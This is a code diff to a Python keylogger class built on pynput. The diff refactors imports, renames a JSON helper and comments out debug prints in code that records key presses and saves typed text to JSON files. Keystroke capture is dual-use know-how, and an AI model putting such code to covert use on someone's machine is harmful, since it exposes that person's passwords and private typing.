@@ -8,9 +8,10 @@ from pynput.keyboard import Listener
 from pynput import keyboard
 from Loggers.Logger import Logger
 from Functions.JSONLib import JSONLib
+from Loggers.app_logger import ROOT
 
 logger = Logger()
-JSON = JSONLib()
+json = JSONLib()
 
 class KeyLogger(Logger):
 
@@ -44,7 +45,7 @@ class KeyLogger(Logger):
         functions_keys = ["Key.enter", "Key.tab", "Key.esc"]
 
         if not str(key) in functions_keys:
-            print(str(key) == "Key.space")
+            # print(str(key) == "Key.space")
             if str(key) == "Key.space":
                 self.__add_in_text(" ")
             if str(key) == "Key.backspace":
@@ -54,9 +55,8 @@ class KeyLogger(Logger):
         if str(key) in functions_keys:
             self.set_keys(self.get_text(), text=True)
             self.set_keys(str(key).replace("Key.", "").upper(), key_press=key, text=False)
-            from Loggers.app_logger import ROOT
             
-            JSON.save_text_data(self.get_text(), str(key).replace("Key.", "").upper())
+            json.save_text_data(self.get_text(), str(key).replace("Key.", "").upper())
             self.text = "" 
         if str(key) == "Key.cmd":
             self.set_keys("SUPER", key_press=key, text=False)
@@ -78,7 +78,7 @@ class KeyLogger(Logger):
         logger.log_debug(message=f"{key} pressed")
         logger.log_info(message=f"{key}", key_press=key, text=False)
         self.__add_pressed_key_in_list_of_texts(str(key))
-        print(self.get_keys())
+        # print(self.get_keys())
         
     def on_release(self, key) -> str:
         logger.log_debug(message=f"{key} released")
